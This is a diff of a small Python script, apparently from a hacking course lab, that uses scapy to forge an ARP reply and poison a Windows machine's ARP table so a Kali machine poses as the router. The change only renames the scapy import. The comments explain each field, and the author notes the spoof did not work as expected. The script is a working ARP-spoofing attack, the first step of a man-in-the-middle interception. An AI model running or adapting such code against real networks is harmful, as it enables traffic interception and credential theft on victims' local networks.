@@ -1,6 +1,6 @@
 
 #!/usr/bin/env python
-import scapy.layers.l2 as scapy1
+import scapy.all as scapy
 from scapy import *
 
 # Here we are going to create an arp packet
@@ -56,7 +56,7 @@ from scapy import *
 #4 source where this packet is coming from: we will forge or provide false information here, we will tell windows as if it is coming from router, but we will be router ip here
 ##THus an ARP packet is created and stored in variable
 ##THus we have wrongly set ip of router with mac address of kali machine. so windows will believe kali machine as router
-packet = scapy1.ARP(op=2, pdst="192.168.177.133" , hwdst="00-0C-29-DC-63-18", psrc="192.168.177.2")
+packet = scapy.ARP(op=2, pdst="192.168.177.133" , hwdst="00-0C-29-DC-63-18", psrc="192.168.177.2")
 packet.show()
 packet.summary()
 ##before we send arp table of target machine is
@@ -85,7 +85,7 @@ packet.summary()
 #         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
 #         device interrupt 19  base 0x2000
 
-scapy1.sendp(packet)
+scapy.sendp(packet)
 #after running we can see mac address of router changed to: which is mac address of kali machine
 # in our machine it is not accepting send method and if we use sendp(), mac address of router does not get changed for windows machine in arp table for some reason , but ideally it should be changed with mac address of kali machin
 
